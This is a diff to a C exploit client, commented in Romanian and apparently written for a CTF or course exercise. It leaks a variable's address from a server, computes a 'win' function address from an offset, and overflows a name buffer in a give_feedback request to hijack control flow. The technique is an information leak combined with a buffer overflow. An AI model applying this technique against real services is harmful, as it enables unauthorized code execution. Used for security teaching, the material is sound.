@@ -1,12 +1,11 @@
 #include "request.h"
 
 //TO BE UPDATED
-#define OFFSET_TO_WIN 1000
+#define OFFSET_TO_WIN (0x100008338 - 0x100000fd0)
 
 int main()
 {
     int ret;
-
 
     /* Ne asiguram ca avem o tara cu 0 populatie */
     struct request add_country = {0};
@@ -22,7 +21,6 @@ int main()
 
     sleep(1);
 
-
     /* Dam leak la adresa variabilei population */
     struct request leak = {0};
     leak.message = "POP dummy_country";
@@ -36,11 +34,13 @@ int main()
     }
     ret = read_response(&leak);
 
-
     /* Calculam adresa functiei win cu ajutorul adresei la care am dat leak */
     uint64_t pop_adr = strtoull(leak.response, NULL, 0);
-    int * win_adr = pop_adr + OFFSET_TO_WIN;
+    uint64_t win_adr = pop_adr - OFFSET_TO_WIN;
 
+    printf("OFF: %p\n", (void *)OFFSET_TO_WIN);
+    printf("POP: %p\n", (void *)pop_adr);
+    printf("WIN: %p\n", (void *)win_adr);
 
     /* Pregatim numele pe care il vom pasa ca argument lui give_feedback */
     int win_adr_size = sizeof(win_adr);
@@ -53,20 +53,22 @@ int main()
     for (int i = 0; i < NAME_BUFF_SIZE + PADDING; i++)
         name_overflow[i] = 'h';
     for (int i = 0; i < win_adr_size; i++)
-        name_overflow[NAME_BUFF_SIZE + PADDING + i] = ((char *) &win_adr)[i];
-    name_overflow[name_overflow_len - 1] = '/0';
+        name_overflow[NAME_BUFF_SIZE + PADDING + i] = ((char *)&win_adr)[i];
+    name_overflow[name_overflow_len - 1] = '\0';
 
+    printf("Name: %s\n", name_overflow);
 
     /* Cream request-ul pentru give_feedback */
-    const char * REQ = "WRT ";
-    const char * FEEDBACK_LEN = " 0 ";
-    const char * LANG_ID = "0";
+    const char *REQ = "WRT ";
+    const char *FEEDBACK_LEN = " 1 ";
+    const char *LANG_ID = "0";
     char give_feedback_req[strlen(REQ) + name_overflow_len + strlen(FEEDBACK_LEN) + strlen(LANG_ID) + 1];
     strcpy(give_feedback_req, REQ);
     strcat(give_feedback_req, name_overflow);
     strcat(give_feedback_req, FEEDBACK_LEN);
     strcat(give_feedback_req, LANG_ID);
 
+    printf("Sending:\n%d: %s\n", strlen(give_feedback_req), give_feedback_req);
 
     /* Exploatam give_feedback */
     struct request give_feedback = {0};
@@ -82,14 +84,19 @@ int main()
 
     sleep(1);
 
+    give_feedback.message = "S";
+    give_feedback.message_length = 1;
+    update_request(&give_feedback, 1024);
+
+    sleep(1);
+
     ret = read_response(&give_feedback);
     if (ret != 0)
     {
         puts("Err read response");
         return -1;
     }
-
-    
+    sleep(1);
     // printing the result of the exploit
     puts(give_feedback.response);
 
